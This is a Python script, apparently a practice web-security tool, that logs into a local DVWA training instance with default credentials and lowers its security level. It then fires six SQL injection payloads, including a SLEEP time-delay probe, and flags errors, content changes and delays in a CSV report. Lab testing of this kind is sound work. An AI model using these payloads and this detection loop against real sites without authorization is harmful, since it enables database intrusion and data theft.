# sql_tester.py
"""
DVWA SQL Injection Tester (FINAL FIX)
Works with DVWA Docker version where SQLi page has NO CSRF token.

USAGE: sql_tester_from_scan.py
"""

import csv
import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

BASE_URL = "http://localhost:8080/"
LOGIN_URL = urljoin(BASE_URL, "login.php")
SECURITY_URL = urljoin(BASE_URL, "security.php")
SQLI_URL = urljoin(BASE_URL, "vulnerabilities/sqli/")

HEADERS = {"User-Agent": "WebScanPro/1.0"}
TIME_THRESHOLD = 4

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"\" = \"",
    "' OR '1'='1' -- ",
    "1' OR '1'='1",
    "' OR SLEEP(5)--",
]

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning: mysql_",
    r"unclosed quotation mark",
]
sql_error_re = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)


def extract_token(html):
    """Extract DVWA CSRF token."""
    soup = BeautifulSoup(html, "lxml")
    tok = soup.find("input", {"name": "user_token"})
    return tok.get("value") if tok else None


# -------------------- LOGIN -----------------------
def dvwa_login(session):
    print("[i] Opening login page...")
    r = session.get(LOGIN_URL)
    token = extract_token(r.text)

    if not token:
        print("[!] Login token not found!")
        return False

    payload = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }

    print("[i] Logging in...")
    r2 = session.post(LOGIN_URL, data=payload)

    if "index.php" in r2.url:
        print("[+] Login successful!")
        return True

    print("[!] Login failed!")
    return False


# -------------------- SECURITY LEVEL SET -----------------------
def set_security_low(session):
    """Set DVWA security level to LOW."""
    print("[i] Setting security level to LOW...")

    r = session.get(SECURITY_URL)
    token = extract_token(r.text)

    if not token:
        print("[!] Could not find token for security.php – continuing anyway (Docker DVWA uses cookies).")
        return True  # Docker version often ignores tokens

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }

    session.post(SECURITY_URL, data=payload)
    print("[+] Security level set or not required on Docker build.")
    return True


# -------------------- BASELINE -----------------------
def baseline_request(session, params):
    r = session.get(SQLI_URL, params=params)
    return r.status_code, len(r.text), r.text, r.elapsed.total_seconds()


# -------------------- TESTING -----------------------
def run_tests(session):
    base_params = {"id": "1", "Submit": "Submit"}

    baseline = baseline_request(session, base_params)
    results = []

    print("\n[i] Running SQL Injection Tests...\n")

    for payload in SQL_PAYLOADS:
        test_params = dict(base_params)
        test_params["id"] += payload

        r = session.get(SQLI_URL, params=test_params, timeout=20)

        evidence = []
        length = len(r.text)
        elapsed = r.elapsed.total_seconds()

        if sql_error_re.search(r.text):
            evidence.append("sql_error")

        if abs(length - baseline[1]) > 50:
            evidence.append("content_change")

        if elapsed > TIME_THRESHOLD:
            evidence.append("time_delay")

        results.append({
            "payload": payload,
            "status": r.status_code,
            "elapsed": elapsed,
            "length": length,
            "evidence": "|".join(evidence)
        })

        print(f"[+] Tested payload: {payload}  Evidence: {evidence}")

    return results


# -------------------- MAIN -----------------------
def main():
    print("\n===== DVWA SQL Injection Tester =====\n")

    session = requests.Session()
    session.headers.update(HEADERS)

    if not dvwa_login(session):
        return

    set_security_low(session)

    results = run_tests(session)

    with open("sql_testing_results.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["payload","status","elapsed","length","evidence"])
        writer.writeheader()
        writer.writerows(results)

    print("\n[+] SQL Injection test complete.")
    print("[+] Results saved to sql_testing_results.csv\n")


if __name__ == "__main__":
    main()
